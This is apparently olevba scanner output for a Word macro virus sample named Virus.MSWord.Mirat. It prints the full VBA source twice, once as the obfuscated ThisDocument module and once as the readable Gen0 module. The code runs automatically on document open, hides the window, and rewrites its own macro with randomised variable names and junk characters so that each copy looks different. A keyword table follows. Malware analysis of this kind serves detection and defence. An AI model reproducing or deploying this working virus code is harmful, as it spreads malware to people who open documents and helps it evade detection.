olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next 'M`‘'ŽY[
If ThisDocument.FullName <> Templates(1).FullName Then '`!}'�T
GKHMp = 8 '/`k'7!5
ReDim QAOMp(1 To GKHMp) As String 'IL8'z"p
QAOMp(1) = "GKHMp": QAOMp(2) = "TPKMp": QAOMp(3) = "QAOMp": QAOMp(4) = "JKCMp" 'r=x'"$–
QAOMp(5) = "JJXMp": QAOMp(6) = "IARMp": QAOMp(7) = "BISMp": QAOMp(8) = "JBUMp" '3‰n'f-\
'ascunde fereastra ca sa nu vezi ce se intampla de fapt cu compu' tau :]'{k4'c1„
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize ''"m'J>i
'copiaza continutul din doc. in backup'Śo–'—VY
TPKMp = ActiveDocument.Content 'pJ"'iA&
ActiveDocument.Content = "" ''?J'eŠ”
'copiaza virusul in doc.'Ť‘3'j5L
Set BISMp = ActiveDocument.VBProject.VBComponents(1).CodeModule 'B^6'‰"~
For IARMp = 1 To BISMp.CountOfLines '\@|'Of‰
ActiveDocument.Content = ActiveDocument.Content + BISMp.Lines(IARMp, 1) '%Ll'd:�
Next IARMp '"]a'<Y�
'modif var.'gŽt'ARd
For IARMp = 1 To GKHMp '_;d'�U;
Randomize 'P~n'`%‰
JJXMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'Š‰E
Set JKCMp = ActiveDocument.Content '^B–'?j\
JKCMp.Find.Execute FindText:=QAOMp(IARMp), ReplaceWith:=JJXMp, Replace:=wdReplaceAll 'Fo^'pjg
Next IARMp '\J-'p,z
'copiaza inapoi in macro'�pU'5>k
BISMp.deletelines 1, BISMp.CountOfLines '<[''ia\
JJXMp = ActiveDocument.Content 'x<+'''9
BISMp.AddFromString JJXMp 'k3†'u%Z
ActiveDocument.Content = "" '�%]''#y
ActiveDocument.Content = TPKMp 'CGA'tuR
'Ajusteaza randul gol care apare dupa copiere'pSD'€,)
BISMp.deletelines 1, 1 'U3B'“a!
BISMp.deletelines BISMp.CountOfLines, 1 '—�Š'6KR
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe'v0A'MAt
For IARMp = 2 To BISMp.CountOfLines '0N,'xl0
JBUMp = BISMp.Lines(IARMp, 1) 'xŚŽ'Zd…
If Len(JBUMp) <= 100 Then 'C+H'm�
JBUMp = JBUMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
BISMp.ReplaceLine IARMp, JBUMp 'O{<')i7
End If 'a(,'b)Š
Next IARMp 'Ri?'{Ś1
'Gata,asa ca restauram si fereastra'j‚�'n„�
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize 'ksI'>"Ť
End If '?cS'MY�
End Sub 'yY�':Sj
-------------------------------------------------------------------------------
VBA MACRO Gen0.bas 
in file: Virus.MSWord.Mirat - OLE stream: 'Macros/VBA/Gen0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Poly()
On Error Resume Next
If ThisDocument.FullName <> Templates(1).FullName Then
nr = 8
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "suk": suk(4) = "myRange"
suk(5) = "strip": suk(6) = "ik": suk(7) = "char1": suk(8) = "nam1"
'ascunde fereastra ca sa nu vezi ce se intampla de fapt cu compu' tau :]
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
'copiaza continutul din doc. in backup
bkup = ActiveDocument.Content
ActiveDocument.Content = ""
'copiaza virusul in doc.
Set char1 = ActiveDocument.VBProject.VBComponents(1).CodeModule
For ik = 1 To char1.CountOfLines
ActiveDocument.Content = ActiveDocument.Content + char1.Lines(ik, 1)
Next ik
'modif var.
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp"
Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:=suk(ik), ReplaceWith:=strip, Replace:=wdReplaceAll
Next ik
'copiaza inapoi in macro
char1.deletelines 1, char1.CountOfLines
strip = ActiveDocument.Content
char1.AddFromString strip
ActiveDocument.Content = ""
ActiveDocument.Content = bkup
'Ajusteaza randul gol care apare dupa copiere
char1.deletelines 1, 1
char1.deletelines char1.CountOfLines, 1
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe
For ik = 2 To char1.CountOfLines
nam1 = char1.Lines(ik, 1)
If Len(nam1) <= 100 Then
nam1 = nam1 + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
char1.ReplaceLine ik, nam1
End If
Next ik
'Gata,asa ca restauram si fereastra
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

